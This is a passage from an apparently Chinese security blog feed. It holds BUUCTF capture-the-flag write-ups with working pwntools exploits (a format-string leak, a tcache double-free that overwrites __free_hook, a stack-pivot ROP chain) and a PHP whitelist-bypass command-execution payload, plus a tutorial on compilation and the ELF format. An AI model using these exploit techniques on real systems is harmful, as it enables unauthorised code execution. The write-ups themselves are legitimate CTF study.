!<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑就是之前把flag文件读入内存，然后输入字符串和flag字符串进行对比<br>主函数存在格式化字符串漏洞，我们直接在栈上找到格式化字符串参数的位置，然后直接读出来即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>考点<ol><li>程序调试，栈溢出泄漏地址</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>程序先给了一个输入name和id的东西，发现了格式化字符串但是由于是__printf_chk，所以没找到好的利用点<br>然后下面是输入id，还有个puts，调试发现id后面是有libc函数setbuffer的，又因为是puts函数直接来给他泄漏出来<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>add功能只允许申请0-0x50大小的chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>delete功能存在UAF<br>在老版的libc-2.27下是允许double free存在的<br>然后直接改__free_hook为system一把梭就行了<br>新版的打完今天的VN再试一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actf栈迁移</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="分析回顾栈迁移"><a href="#分析回顾栈迁移" class="headerlink" title="分析回顾栈迁移"></a>分析回顾栈迁移</h2><p>没有开PIE保护和Canary</p><ul><li>IDA分析结果如下<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>题目给出栈地址，我们可以将栈迁移到栈上，布置gadget泄漏libc地址然后one_gadget一把梭</p><ul><li>栈帧结构如下<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制程序从源文件到可执行程序的过程</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>在c语言中，我们都知道一个源程序从源码到可执行文件都要经历预处理，编译，汇编和链接的过程，最终形成可执行文件，然后才被操作系统装载进内存运行。</p><p>为了复习pwn知识，写个文章来探究一下经常被我忽略的关于程序的中间过程。</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>该过程主要处理源代码中以’#’开始的预编译指令<br>具体处理规则如下：</p><ul><li>删除#define并展开所有的宏定义</li><li>处理所有条件预编译指令：如 “#if”等</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置</li><li>删除注释，添加行号和文件名标识</li></ul><p>预编译的过程可用如下指令来执行 </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>源代码如下：<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>经过预编译后：<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程经过一系列词法分析等步骤生成汇编代码文件，是程序构建的核心部分<br>不同的操作系统有不同的编译器，比如Linux下的gcc，g++，Windows下的MSVCCL等（后文都以Linux平台下来探究）<br>我们可以使用<code>gcc -S BinaryName.i -o BinaryName.s</code>或者<code>gcc -S BinaryName -o BinaryName.s</code>来查看经过编译后的文件</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编过程可以将汇编代码转变为机器可以执行的指令<br><code>gcc -c BinaryName.s -o BinaryName.o</code>或<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>我们先看下c语言源代码中的变量和函数</p><h3 id="c语言源代码中的变量和函数"><a href="#c语言源代码中的变量和函数" class="headerlink" title="c语言源代码中的变量和函数"></a>c语言源代码中的变量和函数</h3><ul><li>声明和定义的区别：<ul><li>声明是告诉编译器该变量没有在当前文件中定义而是在其他文件中定义</li><li>定义变量是告诉编译器在生成的目标文件中留出空间来存放该变量</li><li>定义函数是告诉编译器在目标文件中生成该函数的二进制代码</li></ul></li></ul><p>变量类型如下：</p><ol><li>全局变量：非static，表示该变量的生命周期是整个程序的执行期间，可以被其他文件访问</li><li>全局变量：static，生命周期也是整个程序的执行期间，但是不能被其他文件访问</li><li>局部变量：static，生命周期是程序的执行期间，但是作用域仅在该函数体中</li><li>局部变量：非static，仅存在于当前当前函数体中</li></ol><p>对于函数也同理，如果定义了static则无法被其他文件所读取</p><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>部分段名如下</p><ul><li>.data段保存已经初始化的全局静态变量和局部静态变量</li><li>.rodata段存放的是只读数据，一般是程序里面的只读变量（const修饰的）和字符串常量</li><li>.bss段存放的是未初始化的全局变量和局部静态变量</li><li>.comment存放的是编译器版本信息</li><li>.debug存放调试信息</li><li>.dynamic存放动态链接信息</li><li>.strtab String Table字符串表，用于存放ELF文件中用到的各种字符串</li><li>.symtab Symbol Table符号表</li><li>.plt .got 动态链接的跳转表和全局入口表</li><li>.init 程序初始化段</li><li>.fini 程序终结代码段</li></ul><p>ELF文件头结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF header结构体如下<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="源代码到目标文件的处理"><a href="#源代码到目标文件的处理" class="headerlink" title="源代码到目标文件的处理"></a>源代码到目标文件的处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// 全局static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// 声明函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过nm命令来查看目标文件的符号，从左到右分别是变量的相对地址，变量所在段的名字和变量名字。<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>其中a.1922是编译器修改变量名字的结果，因为a是一个局部静态变量，作用域在他的函数体中，所以当我们在不同的函数体中声明相同名字的局部静态变量（这种操作是被允许的）而且其生命周期为整个程序执行时，编译器为了支持这种功能，所以来加后缀来标识不同的局部静态变量。</p><p>我们还可以用objdump来查看目标文件的结构，-h参数可查看各个段的基本信息</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Size表示段长度<br>File off表示在文件中的偏移<br>每个段第二行中的”CONTENTS” “ALLOC”等表示段的属性，”CONTENTS”表示在文件中存在<br>比如数据段的大小为0xc字节大小，因为有三个四字节的变量分别为globalA,globalC和a</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>使用如下命令来完成链接过程<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>可以看到之前的一些相对地址全部变为了绝对地址，完成了地址重定位</p><h2 id="装载运行"><a href="#装载运行" class="headerlink" title="装载运行"></a>装载运行</h2><p>当程序加载进内存程序即可运行，在这个过程中我们不得不提到虚拟内存，动态链接库和函数执行的问题。我们给出程序执行的顺序，具体探究我们等到之后的文章再另行分析。</p><blockquote><p>  1.首先 bash 进行 fork 系统调用，生成一个子进程，接着在子进程中运行 execve 函数指定的 elf 二进制程序（ Linux中执行二进制程序最终都是通过 execve 这个库函数进行的），execve 会调用系统调用把 elf 文件 load 到内存中的代码段(_text)中。<br>2.如果有依赖的动态链接库，会调用动态链接器进行库文件的地址映射，动态链接库的内存空间是被多个进程共享的。<br>3.内核从 elf 文件头得到_start的地址，调度执行流从_start指向的地址开始执行，执行流在_start执行的代码段中跳转到libc中的公共初始化代码段<strong>libc_start_main，进行程序运行前的初始化工作。<br>4.</strong>libc_start_main的执行过程中，会跳转到_init中全局变量的初始化工作，随后调用我们的main函数，进入到主函数的指令流程。</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>《程序员的自我修养》</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 程序与操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 初赛] Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span 